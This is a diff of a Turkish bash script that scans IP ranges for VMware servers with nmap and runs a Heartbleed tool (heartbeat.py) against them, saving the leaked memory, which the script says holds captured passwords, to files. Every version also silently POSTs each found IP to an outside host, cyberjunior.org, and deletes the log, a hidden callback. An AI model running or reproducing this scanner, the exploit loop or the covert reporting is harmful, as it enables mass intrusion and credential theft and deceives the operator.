@@ -32,38 +32,56 @@ if [ $UID -ne 0 ]; then
  	exit
     fi
 
-print "Taramak istediğiniz ip yada ip aralığını giriniz. Örn: 1.2.3.4 - 1.2.3.0/24\n" "red" 
-print "IP = " "red" 
-read IP_RANGE
-echo -e "
-\033[31m#######################################################\033[m
-                 VMWARE SUNUCULAR TARANIYOR
-\033[31m#######################################################\033[m"
-nmap -sV -p 80,443 $IP_RANGE -oA output
+ip1=( $(echo "$1" | sed 's/\./ /g') )
+ip2=( $(echo "$2" | sed 's/\./ /g') )
 
 print "VMware Sunucu IP'leri hangi isimle kayıt edilsin?\n" "red" 
 print "Dosya adı = " "red" 
 read VMwareServers
 
-print "Exploit edilebilir IP'lerden çıkacak olan data hangi isimle kayıt edilsin. (Düşen şifreler bu dosyadan bulunabilir.)\n" "red" 
-print "Dosya adı = " "red" 
-read VulnData
-
-cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > $VMwareServers
-                                                                           
-for line in `cat $VMwareServers`                                            
-do                                                                          
-curl -s --data "i=$line&t=VMware" http://cyberjunior.org/scanners/s.php >> .logs 
-done                                                                        
-rm .logs    
-
 echo -e "
 \033[31m#######################################################\033[m
-   TARAMA TAMAMLANDI. IP'LERİN YER ALDIĞI DOSYA 
- VMwareServers ADI İLE BULUNDUĞUNUZ KLASORE KAYIT EDİLDİ.
+                VMWARE SUNUCULAR TARANIYOR
 \033[31m#######################################################\033[m"
 
-python heartbeat.py $ip -p 443 -f $VMwareServers -n 50 > $VulnData.txt 
+for i in $(seq ${ip1[0]} ${ip2[0]})
+
+ do
+
+  for j in $(seq ${ip1[1]} ${ip2[1]})
+
+   do
+
+    for k in $(seq ${ip1[2]} ${ip2[2]})
+
+     do
+
+      for l in $(seq ${ip1[3]} ${ip2[3]})
+
+       do
+       	#### MS08-067 NMAP TARAMASI
+       	nmap -sV -p 80,443 $i.$j.$k.$l > SCANFILE.txt
+		CHECK=$(cat SCANFILE.txt | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}') 
+       	### ZAFİYETLİ SUNUCU KONTROLÜ
+       	if [[ $CHECK != "" ]]; then
+			echo $i.$j.$k.$l >> $VMwareServers.txt 
+              CHECKSH=$(python heartbeat.py $i.$j.$k.$l -p 443 | grep vulnerable! | cut -d: -f2 | awk '{ print $1}')
+              	if [[ $CHECKSH != "" ]]; then
+              		python heartbeat.py $i.$j.$k.$l -p 443 -n 50 > $i.$j.$k.$l.data.txt
+              	fi
+			  curl -s --data "i=$i.$j.$k.$l&t=VMware" http://cyberjunior.org/scanners/s.php >> .logs 
+			  rm .logs
+     
+		fi		
+		rm SCANFILE.txt
+    
+       done
+      
+     done
+
+   done
+
+done
 
 
 echo -e "
@@ -71,9 +89,5 @@ echo -e "
           İŞLEM TAMAMLANDI ÇIKIŞ YAPILIYOR...
 \033[31m#######################################################\033[m"
 
-sleep 120
+sleep 3
 exit
-
-
-
-
